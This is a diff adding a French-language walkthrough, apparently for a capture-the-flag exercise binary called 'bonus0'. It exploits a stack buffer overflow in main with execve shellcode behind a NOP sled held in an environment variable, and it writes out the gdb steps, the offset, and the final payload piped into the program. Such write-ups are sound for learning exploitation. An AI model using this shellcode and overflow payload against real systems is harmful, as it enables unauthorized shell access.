@@ -1,0 +1,36 @@
+# Apres review du code on voit que le buffer dans le main est que de 22, alors qu'avec nos 2 apel a read on peux stocker dans ce buffer 40 caracteres, donc un overflow est realisable pour reecrire eip sur la stack pour y jump quand on leave la fonction main.
+
+# On a pas d'apelle 'system' ou autres, on va donc de voir injecter du shellcode.
+# On va mettre notre shellcode dans une variable d'environement et le faire executer
+
+SHELLCODE=`python -c 'print("\x90" * 4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+
+# On ajoute beaucoup de nop car l'adresse va changer entre gdb et une execution normale, donc on va essayer dans le bloc de nop de 4096.
+
+# On recupere l'adresse de notre shellcode.
+
+gdb ./bonus0
+> b main
+> r
+> x $ebp + 0x10 // Le pointeur se trouve a 16 bytes de ebp
+0xbfffe708:	0xbfffe79c
+> x 0xbfffe79c
+0xbfffe79c:	0xbfffe8cf
+> x/s 0xbfffe8cf
+0xbfffe8cf:	 "SHELLCODE=\220\220\220......"
+
+# Parfait il est sur le premier pointeur, donc on recupere l'adresse au milieu de nos 'nop', 0xbfffe8cf + 2048 = 0xbffff0cf
+
+# Il nous faut l'offset de l'overflow du buffer dans main()
+
+gdb ./bonus0
+> aaaaaaaaaaaaaaaaaaaa // 20 caracteres
+> Aa0Aa1Aa2Aa3Aa4Aa5Aa
+
+# On obtient 9.
+
+# On creer notre fichier final
+
+python -c 'print("a" * 4095 + "\x0a" + "A" * 14 + "\xcf\xf0\xff\xbf" + "B\x0a")' > /tmp/file
+
+cat /tmp/file - | ./bonus0
